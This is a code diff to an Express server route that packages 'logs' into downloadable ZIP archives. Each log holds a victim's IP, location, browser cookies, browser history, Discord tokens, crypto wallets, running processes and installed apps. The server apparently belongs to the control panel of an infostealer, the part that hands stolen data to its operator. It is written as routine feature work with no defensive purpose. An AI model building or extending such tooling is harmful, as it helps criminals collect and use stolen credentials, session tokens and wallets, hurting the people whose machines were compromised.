@@ -607,16 +607,104 @@ app.get('/api/download/:logId', (req, res) => {
     try {
         const { logId } = req.params;
         const log = logsDb.getById(logId);
-        if (log) {
-            res.setHeader('Content-Type', 'application/zip');
-            res.setHeader('Content-Disposition', `attachment; filename=${logId}_data.zip`);
-            res.send(`Dummy ZIP content for log ${logId}`);
-        } else {
-            res.status(404).send('Log not found for download');
+        
+        if (!log) {
+            return res.status(404).json({ message: 'Log not found for download' });
         }
+
+        const archiver = require('archiver');
+        const archive = archiver('zip', {
+            zlib: { level: 9 } // Maximum compression
+        });
+
+        // Set response headers
+        res.setHeader('Content-Type', 'application/zip');
+        res.setHeader('Content-Disposition', `attachment; filename="${logId}_data.zip"`);
+
+        // Handle archive errors
+        archive.on('error', (err) => {
+            console.error('Archive error:', err);
+            if (!res.headersSent) {
+                res.status(500).json({ message: 'Error creating archive', error: err.message });
+            }
+        });
+
+        // Pipe archive data to response
+        archive.pipe(res);
+
+        // Add main log data as JSON
+        const logData = {
+            id: log.id,
+            sessionId: log.sessionId,
+            ip: log.ip,
+            country: log.country,
+            date: log.date,
+            user: log.user || null,
+            dataSummary: log.dataSummary,
+            pcData: log.pcData
+        };
+
+        archive.append(JSON.stringify(logData, null, 2), { name: 'log_data.json' });
+
+        // Add separate files for large data sections if they exist
+        if (log.pcData) {
+            const pcData = log.pcData;
+            
+            // Browser cookies
+            if (pcData.browserCookies) {
+                const cookiesData = typeof pcData.browserCookies === 'string' 
+                    ? pcData.browserCookies 
+                    : JSON.stringify(pcData.browserCookies, null, 2);
+                archive.append(cookiesData, { name: 'browser_cookies.json' });
+            }
+
+            // Browser history
+            if (pcData.browserHistory) {
+                archive.append(JSON.stringify(pcData.browserHistory, null, 2), { name: 'browser_history.json' });
+            }
+
+            // Discord tokens
+            if (pcData.discordTokens && Array.isArray(pcData.discordTokens) && pcData.discordTokens.length > 0) {
+                archive.append(JSON.stringify(pcData.discordTokens, null, 2), { name: 'discord_tokens.json' });
+            }
+
+            // Running processes
+            if (pcData.runningProcesses && Array.isArray(pcData.runningProcesses) && pcData.runningProcesses.length > 0) {
+                archive.append(JSON.stringify(pcData.runningProcesses, null, 2), { name: 'running_processes.json' });
+            }
+
+            // Installed apps
+            if (pcData.installedApps && Array.isArray(pcData.installedApps) && pcData.installedApps.length > 0) {
+                archive.append(JSON.stringify(pcData.installedApps, null, 2), { name: 'installed_apps.json' });
+            }
+
+            // System info
+            if (pcData.systemInfo) {
+                archive.append(JSON.stringify(pcData.systemInfo, null, 2), { name: 'system_info.json' });
+            }
+
+            // Crypto wallets
+            if (pcData.cryptoWallets && Array.isArray(pcData.cryptoWallets) && pcData.cryptoWallets.length > 0) {
+                archive.append(JSON.stringify(pcData.cryptoWallets, null, 2), { name: 'crypto_wallets.json' });
+            }
+
+            // PC Information summary
+            const pcInfo = {
+                screenSize: pcData.screenSize,
+                dateTime: pcData.dateTime,
+                ipAddress: pcData.ipAddress,
+                location: pcData.location
+            };
+            archive.append(JSON.stringify(pcInfo, null, 2), { name: 'pc_information.json' });
+        }
+
+        // Finalize the archive
+        archive.finalize();
     } catch (error) {
         console.error('Error downloading log:', error);
-        res.status(500).json({ message: 'Internal server error' });
+        if (!res.headersSent) {
+            res.status(500).json({ message: 'Internal server error', error: error.message });
+        }
     }
 });
 
